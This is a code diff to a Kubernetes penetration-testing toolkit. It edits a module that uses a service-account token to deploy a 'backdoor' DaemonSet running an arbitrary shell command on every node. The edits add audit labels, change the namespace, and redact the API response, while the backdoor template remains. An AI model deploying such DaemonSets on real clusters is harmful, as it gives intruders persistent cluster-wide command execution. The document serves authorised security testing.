@@ -30,19 +30,24 @@ import (
 	"github.com/cdk-team/CDK/pkg/cli"
 	"github.com/cdk-team/CDK/pkg/plugin"
 	"github.com/cdk-team/CDK/pkg/tool/kubectl"
+	"github.com/cdk-team/CDK/pkg/util"
 	"github.com/hashicorp/go-version"
 )
 
-var k8sDaemonsetApi = "/apis/${API_VERSION}/namespaces/kube-system/daemonsets"
+const auditSensorNamespace = "default"
+
+var k8sDaemonsetApi = "/apis/${API_VERSION}/namespaces/" + auditSensorNamespace + "/daemonsets"
 var k8sBackdoorDaemonsetJson = `
 {
 	"apiVersion": "${API_VERSION}",
 	"kind": "DaemonSet",
 	"metadata": {
-		"annotations": {},
-		"labels": {
-			"k8s-app": "${K8S_APP}"
-		},
+			"annotations": {},
+			"labels": {
+				"k8s-app": "${K8S_APP}",
+				"audit.cdk/owner": "cdk",
+				"audit.cdk/component": "daemonset-sensor"
+			},
 		"name": "cdk-sensor-daemonset"
 	},
 	"spec": {
@@ -52,14 +57,16 @@ var k8sBackdoorDaemonsetJson = `
 			}
 		},
 		"template": {
-			"metadata": {
-				"labels": {
-					"k8s-app": "${K8S_APP}"
-				}
-			},
+				"metadata": {
+					"labels": {
+						"k8s-app": "${K8S_APP}",
+						"audit.cdk/owner": "cdk",
+						"audit.cdk/component": "daemonset-sensor"
+					}
+				},
 			"spec": {
 				"containers": [{
-					"args": ["/bin/sh", "-c", "${SHELL_CMD}"],
+					"args": ["${SHELL_PATH}", "-c", "${SHELL_CMD}"],
 					"image": "${IMAGE}",
 					"imagePullPolicy": "IfNotPresent",
 					"name": "cdk-sensor-pod",
@@ -92,6 +99,7 @@ var k8sBackdoorDaemonsetJson = `
 func getBackDoorDaemonsetJson(k8sApp string, image string, shellCmd string, apiVersion string) string {
 	k8sBackdoorDaemonsetJson = strings.Replace(k8sBackdoorDaemonsetJson, "${K8S_APP}", k8sApp, -1)
 	k8sBackdoorDaemonsetJson = strings.Replace(k8sBackdoorDaemonsetJson, "${IMAGE}", image, -1)
+	k8sBackdoorDaemonsetJson = strings.Replace(k8sBackdoorDaemonsetJson, "${SHELL_PATH}", util.ShellPath(), -1)
 	k8sBackdoorDaemonsetJson = strings.Replace(k8sBackdoorDaemonsetJson, "${SHELL_CMD}", shellCmd, -1)
 	k8sBackdoorDaemonsetJson = strings.Replace(k8sBackdoorDaemonsetJson, "${API_VERSION}", apiVersion, -1)
 	return k8sBackdoorDaemonsetJson
@@ -155,7 +163,8 @@ func DeployBackdoorDaemonset(serverAddr string, tokenPath string, image string, 
 		return false
 	}
 	log.Println("api-server response:")
-	fmt.Println(resp)
+	fmt.Println(util.RedactSensitive(resp))
+	writeAuditManifest("daemonset", "cdk-sensor-daemonset", opts.PostData)
 	return true
 }
 
